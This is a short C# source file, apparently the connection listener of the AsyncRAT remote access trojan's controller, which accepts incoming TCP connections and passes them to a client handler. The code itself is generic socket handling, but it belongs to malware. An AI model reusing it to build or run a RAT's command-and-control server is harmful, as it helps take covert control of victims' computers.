using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System;
using System.Threading;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        public Socket listener { get; set; }

        public async void Connect(int port)
        {
            try
            {
                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, port);
                listener.SendBufferSize = 50 * 1024;
                listener.ReceiveBufferSize = 50 * 1024;
                listener.ReceiveTimeout = -1;
                listener.SendTimeout = -1;
                listener.Bind(IpEndPoint);
                listener.Listen(50);

                while (true)
                {
                    await Task.Delay(1);
                    listener.BeginAccept(EndAccept, null);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        public void EndAccept(IAsyncResult ar)
        {
            try
            {
                Clients CL = new Clients();
                CL.InitializeClient(listener.EndAccept(ar));
            }
            catch
            { }
        }
    }
}
